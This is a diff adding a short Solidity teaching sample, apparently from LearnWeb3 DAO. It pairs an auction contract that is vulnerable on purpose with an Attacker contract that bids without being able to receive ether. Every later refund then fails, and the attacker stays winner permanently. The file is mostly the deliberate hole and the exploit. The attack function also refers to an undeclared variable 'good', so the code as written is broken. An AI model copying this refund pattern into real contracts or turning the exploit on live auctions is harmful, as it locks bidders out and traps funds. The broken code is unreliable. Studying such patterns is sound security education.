@@ -1,0 +1,46 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+//Auction VictimSmart Contract
+contract AuctionWinner {
+    address public currentWinner;
+    uint public currentAuctionPrice;
+
+    constructor() {
+        currentWinner = msg.sender;
+    }
+
+    function setCurrentAuctionPrice() public payable {
+        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
+        
+        //Below condition can be set false by current winner
+        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
+        
+        //sent can be set to false,if attacker dont have receive or fallback function
+        //thus,current winner will remain as winner
+        if (sent) {
+            currentAuctionPrice = msg.value;
+            currentWinner = msg.sender;
+        }
+    }
+}
+
+
+//Attacker sample code:- 
+import "./AuctionWinner.sol";
+
+contract Attacker {
+    AuctionWinner auctionWinner;
+
+    constructor(address _auctionWinner) {
+       auctionWinner  = AuctionWinner(_auctionWinner);
+    }
+    //attacker send value greater than current auction value
+    //and can become winner and not using any function to receive ether
+    function attack() public payable {
+        good.setCurrentAuctionPrice{value: msg.value}();
+    }
+    
+    
+    //Code Credit to LearnWeb3 DAO
+}
